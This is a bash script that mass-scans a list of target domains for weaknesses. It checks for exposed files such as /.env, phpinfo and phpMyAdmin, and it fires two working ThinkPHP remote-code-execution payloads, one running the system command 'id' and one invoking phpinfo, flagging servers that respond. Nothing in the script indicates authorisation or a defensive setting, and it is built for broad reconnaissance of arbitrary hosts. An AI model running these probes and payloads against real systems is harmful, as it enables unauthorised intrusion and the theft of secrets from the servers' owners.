#!/bin/bash
# Quick vulnerability scan for 15 domains
INPUT=/tmp/scan_targets.txt
OUTPUT=/tmp/quick_scan_results.txt
> $OUTPUT

echo "========== QUICK SCAN START $(date) ==========" >> $OUTPUT

while IFS= read -r domain; do
    [[ -z "$domain" ]] && continue
    echo "" >> $OUTPUT
    echo "=== $domain ===" >> $OUTPUT
    
    # 1. Check alive + headers
    echo "[1] HTTP HEAD check..." >> $OUTPUT
    curl -skIL -o /dev/null -w "HTTP_CODE: %{http_code}\nREDIRECT: %{redirect_url}\nTIME: %{time_total}s\n" --connect-timeout 8 --max-time 15 "http://$domain/" 2>/dev/null >> $OUTPUT
    
    # Headers
    curl -skI --connect-timeout 8 --max-time 15 "http://$domain/" 2>/dev/null | head -30 >> $OUTPUT
    
    # 2. Check common info leaks
    echo "" >> $OUTPUT
    echo "[2] Info leaks..." >> $OUTPUT
    for path in "/phpinfo.php" "/info.php" "/.env" "/adminer.php" "/phpmyadmin/" "/test.php"; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "http://$domain$path" 2>/dev/null)
        [[ "$code" != "000" ]] && echo "  $path -> $code" >> $OUTPUT
    done
    
    # 3. ThinkPHP RCE check
    echo "" >> $OUTPUT
    echo "[3] ThinkPHP RCE probes..." >> $OUTPUT
    # POC1
    tp1=$(curl -sk --connect-timeout 5 --max-time 10 "http://$domain/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id" 2>/dev/null | head -c 500)
    # POC2
    tp2=$(curl -sk --connect-timeout 5 --max-time 10 "http://$domain/?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" 2>/dev/null | head -c 500)
    if echo "$tp1" | grep -q "uid="; then
        echo "  [!] ThinkPHP RCE POC1 HIT! (uid= found)" >> $OUTPUT
    fi
    if echo "$tp2" | grep -qi "phpinfo\|PHP Version"; then
        echo "  [!] ThinkPHP RCE POC2 HIT! (phpinfo found)" >> $OUTPUT
    fi
    
    # 4. Generator / X-Powered-By from body
    body=$(curl -sk --connect-timeout 8 --max-time 15 "http://$domain/" 2>/dev/null | head -c 2000)
    echo "" >> $OUTPUT
    echo "[4] Body snippet (first 500 chars):" >> $OUTPUT
    echo "$body" | head -c 500 >> $OUTPUT
    
    echo "" >> $OUTPUT
    echo "---" >> $OUTPUT
done < "$INPUT"

echo "" >> $OUTPUT
echo "========== SCAN COMPLETE $(date) ==========" >> $OUTPUT
echo "DONE"
